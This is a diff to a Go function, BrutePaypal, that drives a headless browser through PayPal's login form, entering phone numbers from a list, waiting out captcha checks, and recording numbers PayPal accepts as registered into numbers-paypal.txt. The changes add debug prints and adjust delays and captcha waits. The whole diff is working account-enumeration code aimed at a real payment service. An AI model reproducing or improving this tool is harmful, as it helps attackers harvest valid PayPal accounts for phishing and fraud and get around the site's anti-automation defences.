@@ -51,23 +51,34 @@ func BrutePaypal() {
 	for indexPayload := 0; indexPayload < len(payloads); indexPayload++ {
 		isRestart := ""
 		numberphone := payloads[indexPayload]
+		fmt.Println(1)
+		err := chromedp.Run(ctx,
+			chromedp.Sleep(1*time.Second),
+			chromedp.WaitNotPresent(`[action='/auth/validatecaptcha']`, chromedp.ByQuery),
+		)
+		if err != nil {
+			log.Fatal(err)
+		}
 		if errorUser != "" || firsAcess {
+			fmt.Println(2)
 			err := chromedp.Run(ctx,
 				chromedp.WaitVisible(`#email`, chromedp.ByID),
-				chromedp.Sleep(1*time.Second),
-				chromedp.WaitNotPresent(`[action='/auth/validatecaptcha']`, chromedp.ByQuery),
 				chromedp.SendKeys(`#email`, numberphone, chromedp.ByID),
-				chromedp.Sleep(500*time.Millisecond),
+				chromedp.Sleep(800*time.Millisecond),
 				chromedp.KeyEvent(kb.Enter),
-				chromedp.WaitReady(`.transitioning.spinner`, chromedp.ByQuery),
+				chromedp.Sleep(500*time.Millisecond),
 				chromedp.WaitReady(`.notification-warning, .transitioning.hide`, chromedp.ByQuery),
 				chromedp.Sleep(1*time.Second),
+				chromedp.WaitNotPresent(`[action='/auth/validatecaptcha']`, chromedp.ByQuery),
+				chromedp.Sleep(650*time.Millisecond),
 				chromedp.Evaluate(`!document.getElementsByClassName("notification-warning")[0].className.includes("hide")?document.getElementsByClassName("notification-warning")[0].innerText:""`, &errorUser),
 			)
 			if err != nil {
 				log.Fatal(err)
 			}
+			fmt.Println(3)
 		} else {
+			fmt.Println(4)
 			err := chromedp.Run(ctx,
 				chromedp.WaitReady(`#backToInputEmailLink`, chromedp.ByID),
 				chromedp.Evaluate(`document.querySelector("#backToInputEmailLink").parentElement.className.includes("hide")?"":"visible"`, &isRestart),
@@ -76,6 +87,7 @@ func BrutePaypal() {
 				log.Fatal(err)
 			}
 			if isRestart == "visible" {
+				fmt.Println(5)
 				err = chromedp.Run(ctx,
 					chromedp.WaitVisible(`#backToInputEmailLink`, chromedp.ByID),
 					chromedp.Evaluate(`document.getElementById("backToInputEmailLink").click()`, nil),
@@ -88,17 +100,20 @@ func BrutePaypal() {
 					chromedp.WaitReady(`.transitioning.spinner`, chromedp.ByQuery),
 					chromedp.WaitReady(`.notification-warning, .transitioning.hide`, chromedp.ByQuery),
 					chromedp.Sleep(1*time.Second),
+					chromedp.WaitNotPresent(`[action='/auth/validatecaptcha']`, chromedp.ByQuery),
+					chromedp.Sleep(650*time.Millisecond),
 					chromedp.Evaluate(`!document.getElementsByClassName("notification-warning")[0].className.includes("hide")?document.getElementsByClassName("notification-warning")[0].innerText:""`, &errorUser),
 				)
 				if err != nil {
 					log.Fatal(err)
 				}
 			} else {
+				fmt.Println(6)
 				err := chromedp.Run(ctx,
-					chromedp.Sleep(1*time.Second),
 					chromedp.WaitVisible(`#email`, chromedp.ByID),
+					chromedp.Sleep(1*time.Second),
 					chromedp.WaitNotPresent(`[action='/auth/validatecaptcha']`, chromedp.ByQuery),
-					chromedp.Sleep(500*time.Millisecond),
+					chromedp.Sleep(650*time.Millisecond),
 					chromedp.Evaluate(`!document.getElementsByClassName("notification-warning")[0].className.includes("hide")?document.getElementsByClassName("notification-warning")[0].innerText:""`, &errorUser),
 				)
 				if err != nil {
@@ -107,6 +122,7 @@ func BrutePaypal() {
 			}
 		}
 		if errorUser != "" {
+			fmt.Println(7)
 			fmt.Println("[-] User Not Exist:", numberphone)
 		} else {
 			WriteToFile("numbers-paypal.txt", numberphone+"\n", "./numberphone/")
